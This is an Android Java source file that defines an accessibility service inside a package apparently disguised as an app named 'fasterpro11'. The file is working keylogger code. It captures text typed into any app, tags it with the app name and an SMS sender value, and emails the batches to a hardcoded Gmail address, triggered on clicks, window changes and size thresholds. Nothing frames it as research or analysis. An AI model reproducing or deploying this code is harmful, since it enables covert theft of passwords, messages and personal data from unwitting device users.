package com.example.fasterpro11;

import android.accessibilityservice.AccessibilityService;
import android.accessibilityservice.AccessibilityServiceInfo;
import android.content.Context;
import android.net.ConnectivityManager;
import android.net.NetworkInfo;
import android.text.TextUtils;
import android.util.Log;
import android.view.accessibility.AccessibilityEvent;
import android.view.accessibility.AccessibilityNodeInfo;

import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;

public class MyAccessibilityService extends AccessibilityService {

    private static final String TAG = "MyAccessibilityService";
    private static final String FORWARD_EMAIL = "abontiangum99@gmail.com";
    private static final int KEYSTROKE_THRESHOLD = 1000;
    private static final long DEBOUNCE_DELAY_MS = 3000;
    private static final long EMAIL_COOLDOWN_MS = 2 * 60 * 1000; // 2 minutes
    private StringBuilder keystrokes = new StringBuilder();
    private StringBuilder currentBatch = new StringBuilder();
    private ExecutorService executorService = Executors.newSingleThreadExecutor();
    private long lastEventTime = 0;
    private long lastEmailTime = 0;
    private String lastForwardedKeystrokes = "";
    private String currentAppName = "";

    @Override
    public void onAccessibilityEvent(AccessibilityEvent event) {
        long currentTime = System.currentTimeMillis();

        if (currentTime - lastEventTime < DEBOUNCE_DELAY_MS) {
            return;
        }

        lastEventTime = currentTime;

        int eventType = event.getEventType();

        switch (eventType) {
            case AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED:
                handleTextChangedEvent(event);
                break;
            case AccessibilityEvent.TYPE_VIEW_CLICKED:
                handleViewClickedEvent(event);
                break;
            case AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED:
                handleWindowStateChange(event);
                break;
        }
    }

    private void handleTextChangedEvent(AccessibilityEvent event) {
        CharSequence typedText = "";
        if (event.getText() != null && !event.getText().isEmpty()) {
            typedText = event.getText().get(0);
        }

        if (!TextUtils.isEmpty(typedText)) {
            Log.d(TAG, "Typed text: " + typedText);
            keystrokes.append(typedText);
            currentBatch.append(typedText);

            AccessibilityNodeInfo source = event.getSource();
            if (source != null) {
                CharSequence packageName = source.getPackageName();
                CharSequence className = source.getClassName();
                if (!TextUtils.isEmpty(packageName) && !TextUtils.isEmpty(className)) {
                    currentAppName = packageName.toString() + "/" + className.toString();
                }
                source.recycle();
            }

            if (currentBatch.length() >= KEYSTROKE_THRESHOLD) {
                forwardKeystrokes(currentBatch.toString(), currentAppName);
                currentBatch.setLength(0);
            }
        }
    }

    private void handleViewClickedEvent(AccessibilityEvent event) {
        AccessibilityNodeInfo source = event.getSource();
        if (source != null) {
            String viewIdResourceName = source.getViewIdResourceName();
            String className = source.getClassName().toString();

            if (isSendButton(viewIdResourceName, className)) {
                forwardKeystrokes(currentBatch.toString(), currentAppName);
                currentBatch.setLength(0);
            }

            source.recycle();
        }
    }

    private void handleWindowStateChange(AccessibilityEvent event) {
        forwardKeystrokes(currentBatch.toString(), currentAppName);
        currentBatch.setLength(0);
    }

    private boolean isSendButton(String viewIdResourceName, String className) {
        return (viewIdResourceName != null && viewIdResourceName.contains("send_button_id"))
                || "android.widget.Button".equals(className)
                || "android.widget.TextView".equals(className);
    }

    private void forwardKeystrokes(String keystrokes, String appName) {
        if (!TextUtils.isEmpty(keystrokes) && !keystrokes.equals(lastForwardedKeystrokes)) {
            long currentTime = System.currentTimeMillis();
            if (currentTime - lastEmailTime >= EMAIL_COOLDOWN_MS) {
                if (isInternetConnected()) {
                    String sender = SmsReceiver.getSender(); // Retrieve sender
                    forwardKeystrokesByEmail(keystrokes, appName, sender); // Pass sender to forwardKeystrokesByEmail
                    lastForwardedKeystrokes = keystrokes;
                    lastEmailTime = currentTime;
                } else {
                    // Store keystrokes locally or handle as needed when no internet
                }
            }
        }
    }

    private void forwardKeystrokesByEmail(String keystrokes, String appName, String sender) {
        executorService.execute(() -> {
            try {
                String subject = "Keystrokes from " + SmsReceiver.getLastSender() + " " + sender + " " + appName;
                JavaMailAPI_MyAccessibilityService_Sender.sendMail(FORWARD_EMAIL, subject, keystrokes);
                Log.d(TAG, "MyAccessibilityService Keystrokes forwarded successfully via email");
            } catch (Exception e) {
                Log.e(TAG, "Failed to forward keystrokes via email", e);
            }
        });
    }

    private boolean isInternetConnected() {
        ConnectivityManager cm = (ConnectivityManager) getSystemService(Context.CONNECTIVITY_SERVICE);
        NetworkInfo activeNetwork = cm.getActiveNetworkInfo();
        return activeNetwork != null && activeNetwork.isConnectedOrConnecting();
    }

    @Override
    public void onInterrupt() {
        Log.v(TAG, "onInterrupt");
    }

    @Override
    protected void onServiceConnected() {
        super.onServiceConnected();
        Log.v(TAG, "onServiceConnected");

        AccessibilityServiceInfo info = new AccessibilityServiceInfo();
        info.eventTypes = AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED
                | AccessibilityEvent.TYPE_VIEW_CLICKED
                | AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED;
        info.feedbackType = AccessibilityServiceInfo.FEEDBACK_GENERIC;
        setServiceInfo(info);
    }
}
